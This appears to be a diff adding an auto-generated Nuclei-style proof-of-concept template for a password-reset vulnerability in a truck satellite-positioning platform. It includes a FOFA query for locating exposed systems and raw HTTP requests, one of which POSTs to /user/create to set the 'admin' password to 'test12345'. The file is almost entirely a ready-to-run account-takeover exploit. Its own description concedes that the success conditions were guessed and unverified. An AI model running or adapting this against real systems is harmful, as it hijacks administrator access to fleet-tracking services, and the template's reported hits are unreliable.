@@ -1,0 +1,65 @@
+id: poc-7f509618200bf261ad79
+info:
+  name: 卡车卫星定位系统存在密码重置漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/7f509618200bf261ad790cba529446ee
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 7f509618200bf261ad790cba529446ee
+    fofa: + fofa`icon_hash="1553867732"`
+http:
+- raw:
+  - 'GET /user/1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    X-Requested-With: XMLHttpRequest
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /user/create HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 216
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    X-Requested-With: XMLHttpRequest
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: wcms5c={%22L%22:%22en-US%22%2C%22V%22:%226.0.0.0%22%2C%22HP%22:8090%2C%22FP%22:[12060%2C12061%2C12062%2C12063]%2C%22TP%22:17891%2C%22RP%22:3113}
+
+    Connection: close
+
+
+    account=admin&id=1&password=test12345&passwordRepeat=test12345&groupName=111&roleid=5&validend=&phone=&email=&chncount=36&flowType=1&oldFlowType=&flowVal=&flowAlarmVal=&oldFlowAlarmVal=&logContent=111&guid=222&token='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
